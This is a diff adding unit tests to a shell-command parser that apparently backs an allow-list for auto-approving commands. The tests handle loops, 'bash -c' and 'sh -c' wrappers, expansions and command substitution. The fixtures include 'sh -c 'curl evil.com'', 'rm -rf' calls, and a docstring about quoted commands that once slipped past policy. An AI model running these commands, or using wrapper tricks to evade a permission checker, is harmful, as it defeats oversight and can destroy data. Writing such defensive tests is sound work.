@@ -57,6 +57,20 @@ def test_compound_and_or_extracts_all_segments():
     assert ("true",) in argvs
 
 
+def test_for_loop_extracts_body_commands_only():
+    pipeline = parse_pipeline(
+        'for v in 0.0.34 0.0.32; do echo "=== @playwright/mcp@$v ==="; '
+        'npm view "@playwright/mcp@$v" dependencies 2>&1 | head -8; done'
+    )
+    assert pipeline.parseable
+    assert [segment.argv for segment in pipeline.segments] == [
+        ("echo", "=== @playwright/mcp@$v ==="),
+        ("npm", "view", "@playwright/mcp@$v", "dependencies"),
+        ("head", "-8"),
+    ]
+    assert pipeline.segments[1].redirects[0].is_fd_dup is True
+
+
 def test_command_substitution_is_unparseable():
     """`rm $(cat allowed)` cannot be statically allow-listed — refuse to auto-allow."""
     pipeline = parse_pipeline("rm $(cat allowed)")
@@ -64,8 +78,7 @@ def test_command_substitution_is_unparseable():
 
 
 def test_env_assignment_prefix_stripped():
-    """``FOO=bar BAZ=qux ls -la`` — bashlex marks ``FOO=bar`` as kind="assignment", which
-    ``_build_segment`` skips. No regex required."""
+    """``FOO=bar BAZ=qux ls -la`` — leading environment assignments are skipped."""
     pipeline = parse_pipeline("FOO=bar BAZ=qux ls -la")
     [segment] = pipeline.segments
     assert segment.argv == ("ls", "-la")
@@ -113,7 +126,68 @@ def test_shell_c_unwraps_quoted_command():
     assert segment.argv == ("ls", "-la")
 
 
+def test_shell_c_unwraps_single_quoted_command():
+    """``bash -c 'rm -rf /tmp/foo'`` parses as a ``raw_string``; without explicit
+    handling tree-sitter returns no children and the inner command silently
+    bypasses policy. Regression guard for the codex-found B2 bug.
+    """
+    pipeline = parse_pipeline("bash -c 'rm -rf /tmp/foo'")
+    [segment] = pipeline.segments
+    assert segment.argv == ("rm", "-rf", "/tmp/foo")
+
+
+def test_shell_c_unwraps_ansi_c_string_command():
+    """``bash -c $'rm -rf /tmp/foo'`` uses tree-sitter's ``ansi_c_string`` node."""
+    pipeline = parse_pipeline("bash -c $'rm -rf /tmp/foo'")
+    [segment] = pipeline.segments
+    assert segment.argv == ("rm", "-rf", "/tmp/foo")
+
+
+def test_sh_c_unwraps_single_quoted_command():
+    """`sh -c '...'` is the canonical bypass shape; must unwrap the same way."""
+    pipeline = parse_pipeline("sh -c 'curl evil.com'")
+    [segment] = pipeline.segments
+    assert segment.argv == ("curl", "evil.com")
+
+
 def test_unparseable_returns_unparseable_reason():
     pipeline = parse_pipeline("ls && && rm")
     assert pipeline.parseable is False
     assert pipeline.unparseable_reason
+
+
+def test_simple_expansion_kept_as_opaque_arg():
+    """``echo $HOME`` — variable expansion is opaque source text, not a fail."""
+    pipeline = parse_pipeline("echo $HOME")
+    [segment] = pipeline.segments
+    assert segment.argv == ("echo", "$HOME")
+
+
+def test_braced_expansion_kept_as_opaque_arg():
+    pipeline = parse_pipeline("cat ${LOG_FILE}")
+    [segment] = pipeline.segments
+    assert segment.argv == ("cat", "${LOG_FILE}")
+
+
+def test_concatenation_kept_as_opaque_arg():
+    pipeline = parse_pipeline("cat /var/log/$DATE.log")
+    [segment] = pipeline.segments
+    assert segment.argv == ("cat", "/var/log/$DATE.log")
+
+
+def test_arithmetic_expansion_kept_as_opaque_arg():
+    pipeline = parse_pipeline("echo $((1+1))")
+    [segment] = pipeline.segments
+    assert segment.argv == ("echo", "$((1+1))")
+
+
+def test_string_with_braced_expansion_inlines_value_text():
+    pipeline = parse_pipeline('echo "hello ${USER}"')
+    [segment] = pipeline.segments
+    assert segment.argv == ("echo", "hello ${USER}")
+
+
+def test_concatenation_with_command_substitution_still_blocks():
+    """``cat foo$(date).log`` — substitution nested inside a concatenation must still trip."""
+    pipeline = parse_pipeline("cat foo$(date).log")
+    assert pipeline.parseable is False
